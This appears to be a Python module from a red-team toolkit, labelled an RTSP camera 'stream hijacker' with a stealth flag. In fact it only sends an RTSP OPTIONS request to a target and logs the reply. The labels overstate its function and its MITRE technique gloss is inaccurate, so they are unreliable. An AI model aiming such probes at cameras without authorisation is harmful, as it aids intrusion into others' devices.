# modules/exploits/rtsp_stream_hijacker.py

import argparse
import socket
from datetime import datetime
import os
import json

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1123"  # Audio Capture (Camera Feed Interception)

def log_hijack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def hijack_rtsp_stream(target_ip, port, stealth):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, port))

        setup_payload = (
            "OPTIONS rtsp://{}/ RTSP/1.0\r\n"
            "CSeq: 1\r\n"
            "User-Agent: REDoT-RTSP-Hijacker\r\n\r\n"
        ).format(target_ip)

        s.send(setup_payload.encode())
        response = s.recv(4096).decode()

        if not stealth:
            print(f"[âœ“] Response from {target_ip}:{port}:\n{response[:300]}")

        log_hijack({
            "timestamp": datetime.utcnow().isoformat(),
            "target_ip": target_ip,
            "port": port,
            "response": response[:500],
            "ttp": MITRE_TTP
        })

        s.close()
    except Exception as e:
        print(f"[!] RTSP hijack failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RTSP Stream Hijacker")
    parser.add_argument("--ip", required=True, help="Target RTSP camera IP")
    parser.add_argument("--port", type=int, default=554, help="RTSP port (default: 554)")
    parser.add_argument("--stealth", action="store_true", help="Suppress output")
    args = parser.parse_args()

    hijack_rtsp_stream(args.ip, args.port, args.stealth)
